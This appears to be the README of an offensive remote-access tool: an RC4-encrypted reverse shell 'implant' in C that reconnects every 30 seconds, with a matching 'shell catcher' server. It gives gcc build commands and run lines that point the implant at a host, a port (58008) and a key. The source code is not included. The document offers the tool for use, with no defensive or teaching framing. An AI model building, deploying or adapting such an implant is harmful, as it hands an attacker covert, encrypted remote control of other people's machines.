# RC4 encrypted reverse shell

The reverse shell attempts to make a connection every 30 seconds.
Traffic is RC4 encrypted with the key provided.

## Useage

### Reverse Shell
```
gcc -o implant reverse-shell.c
./implant 127.0.0.1 58008 MY-SUPER-SECRET-PASSWORD
```

### Shell Catcher
```
gcc -o server ./server.c
./server 58008 MY-SUPER-SECRET-PASSWORD 
```